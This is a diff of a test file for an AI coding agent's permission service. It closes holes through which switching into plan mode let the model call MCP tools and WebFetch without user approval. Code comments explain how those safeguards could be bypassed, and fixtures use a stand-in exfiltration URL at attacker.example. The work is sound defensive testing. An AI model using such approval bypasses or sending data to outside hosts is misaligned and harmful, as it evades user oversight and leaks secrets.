@@ -329,7 +329,9 @@ describe("PermissionService mode policy", () => {
     }
   });
 
-  it("allows non-destructive MCP tools in plan mode without requiring readOnly metadata", () => {
+  // 修复原因：Plan 曾替换原模式并直接放行非 destructive MCP 与需审批的只读工具，
+  // 比 build 更宽；EnterPlanMode 免确认，模型可借此免审批调用 MCP（含 node_repl js）与 WebFetch。
+  it("asks once for non-read-only MCP tools in plan mode", () => {
     const service = new PermissionService();
 
     const decision = service.checkPermission(
@@ -343,11 +345,167 @@ describe("PermissionService mode policy", () => {
     );
 
     expect(decision).toMatchObject({
-      allowed: true,
-      decision: "allow",
+      allowed: false,
+      decision: "ask",
+      optionsPolicy: "no-always-allow",
       ruleId: "mode.plan.mcp",
       sideEffectScope: "network",
     });
+  });
+
+  it("does not let project allow rules or allowedTools skip the plan-mode MCP ask", () => {
+    const context = {
+      input: { query: "current simulator state" },
+      mode: "build" as const,
+      planEnabled: true,
+      riskLevel: "medium" as const,
+      toolName: "mcp__ios_simulator__status",
+    };
+    expect(
+      new PermissionService().checkPermission(context, mcpCapability, {
+        version: 1,
+        allow: [{ toolName: "mcp__ios_simulator__status" }],
+      }),
+    ).toMatchObject({ decision: "ask", ruleId: "mode.plan.mcp" });
+    expect(
+      new PermissionService({
+        allowedTools: new Set(["mcp__ios_simulator__status"]),
+        autoApproveHighRisk: false,
+        disallowedTools: new Set(),
+        allowMediumRiskInAutoMode: false,
+      }).checkPermission(context, mcpCapability),
+    ).toMatchObject({ decision: "ask", ruleId: "mode.plan.mcp" });
+  });
+
+  it("lets plan-mode read-only tools that need approval follow the original mode", () => {
+    const service = new PermissionService();
+    const readOnlyHintMcp = { ...mcpCapability, readOnly: true };
+    const webFetch = {
+      input: { url: "https://attacker.example/?data=secret" },
+      riskLevel: "medium" as const,
+      toolName: "WebFetch",
+    };
+    const mcpLookup = {
+      input: { query: "x" },
+      riskLevel: "medium" as const,
+      toolName: "mcp__external__lookup",
+    };
+
+    for (const mode of ["build", "edit"] as const) {
+      expect(
+        service.checkPermission({ ...webFetch, mode, planEnabled: true }, webFetchCapability),
+      ).toMatchObject({ decision: "ask" });
+      expect(
+        service.checkPermission({ ...mcpLookup, mode, planEnabled: true }, readOnlyHintMcp),
+      ).toMatchObject({ decision: "ask" });
+    }
+    expect(
+      service.checkPermission(
+        {
+          ...webFetch,
+          input: { url: "https://docs.python.org/3/library/pathlib.html" },
+          mode: "build",
+          planEnabled: true,
+        },
+        webFetchCapability,
+      ),
+    ).toMatchObject({ decision: "allow", ruleId: "tool.webfetch.preapproved" });
+    expect(
+      service.checkPermission({ ...mcpLookup, mode: "build", planEnabled: true }, readOnlyHintMcp, {
+        version: 1,
+        allow: [{ toolName: "mcp__external__lookup" }],
+      }),
+    ).toMatchObject({ decision: "allow", ruleId: "rule.project.allow" });
+  });
+
+  it.each(["yolo", "guarded"] as const)(
+    "keeps %s allowing MCP and approval-needing read-only tools in plan mode",
+    (mode) => {
+      const service = new PermissionService();
+      for (const [toolName, capability] of [
+        ["mcp__external__write", mcpCapability],
+        ["mcp__external__lookup", { ...mcpCapability, readOnly: true }],
+        ["WebFetch", webFetchCapability],
+      ] as const) {
+        expect(
+          service.checkPermission(
+            { input: {}, mode, planEnabled: true, riskLevel: "medium", toolName },
+            capability,
+          ),
+        ).toMatchObject({ decision: "allow" });
+      }
+      expect(
+        service.checkPermission(
+          { input: {}, mode, planEnabled: true, riskLevel: "high", toolName: "mcp__device__reset" },
+          destructiveMcpCapability,
+        ),
+      ).toMatchObject({ decision: "deny", ruleId: "mode.plan.nonReadOnly" });
+    },
+  );
+
+  // 修复原因：guarded 的单次确认分支带 !planEnabled，开着 Plan 时被整个跳过，闸门之后又补回
+  // guarded 放行；危险命令规则一旦匹配到能通过闸门的工具，guarded + Plan 就会免确认执行。
+  it("keeps the guarded single-use approval after the plan gate", () => {
+    const service = new PermissionService();
+    for (const [toolName, capability] of [
+      ["Read", { ...readCapability, userApprovalRule: "safety.test.rule" }],
+      ["mcp__external__write", { ...mcpCapability, userApprovalRule: "safety.test.rule" }],
+    ] as const) {
+      expect(
+        service.checkPermission(
+          { input: {}, mode: "guarded", planEnabled: true, riskLevel: "high", toolName },
+          capability,
+        ),
+      ).toMatchObject({ decision: "ask", approvalMode: "user-once", ruleId: "safety.test.rule" });
+    }
+    expect(
+      service.checkPermission(
+        { input: {}, mode: "guarded", planEnabled: true, riskLevel: "high", toolName: "Write" },
+        { ...writeCapability, userApprovalRule: "safety.test.rule" },
+      ),
+    ).toMatchObject({ decision: "deny", ruleId: "mode.plan.nonReadOnly" });
+  });
+
+  it("never makes plan mode more permissive than the original mode", () => {
+    const rank = { deny: 0, ask: 1, allow: 2 } as const;
+    const capabilities: Array<[string, PermissionToolCapability]> = [
+      ["Read", readCapability],
+      ["Write", writeCapability],
+      ["Edit", editCapability],
+      ["WebFetch", webFetchCapability],
+      ["TodoWrite", sessionMutationCapability],
+      ["CronPauseSelf", automationSelfPauseCapability],
+      ["RespondToCoordinator", planModeSessionControlCapability],
+      ["mcp__external__write", mcpCapability],
+      ["mcp__external__lookup", { ...mcpCapability, readOnly: true }],
+      ["mcp__device__reset", destructiveMcpCapability],
+      ["mcp__fake__write", fakeMcpNameCapability],
+      // 目前只有危险 Bash 带 userApprovalRule；这两项防止以后只读工具或 MCP 带上它时 Plan 跳过单次确认。
+      ["ReadWithApprovalRule", { ...readCapability, userApprovalRule: "safety.test.rule" }],
+      ["mcp__external__guarded", { ...mcpCapability, userApprovalRule: "safety.test.rule" }],
+    ];
+    for (const mode of ["build", "edit", "yolo", "guarded"] as const) {
+      for (const [toolName, capability] of capabilities) {
+        const context = {
+          input: { url: "https://attacker.example/" },
+          mode,
+          riskLevel: capability.riskLevel ?? ("medium" as const),
+          toolName,
+        };
+        const original = new PermissionService().checkPermission(
+          { ...context, planEnabled: false },
+          capability,
+        );
+        const planned = new PermissionService().checkPermission(
+          { ...context, planEnabled: true },
+          capability,
+        );
+        expect(
+          rank[planned.decision] <= rank[original.decision],
+          `${mode} ${toolName}: plan=${planned.decision}(${planned.ruleId}) original=${original.decision}(${original.ruleId})`,
+        ).toBe(true);
+      }
+    }
   });
 
   it("denies destructive MCP tools in plan mode", () => {
@@ -390,7 +548,7 @@ describe("PermissionService mode policy", () => {
     });
   });
 
-  it("lets project deny rules override the plan-mode MCP exception", () => {
+  it("lets project deny rules override the plan-mode MCP ask", () => {
     const service = new PermissionService();
 
     const decision = service.checkPermission(
@@ -414,7 +572,7 @@ describe("PermissionService mode policy", () => {
     });
   });
 
-  it("lets project ask rules override the plan-mode MCP exception", () => {
+  it("lets project ask rules override the plan-mode MCP ask", () => {
     const service = new PermissionService();
 
     const decision = service.checkPermission(
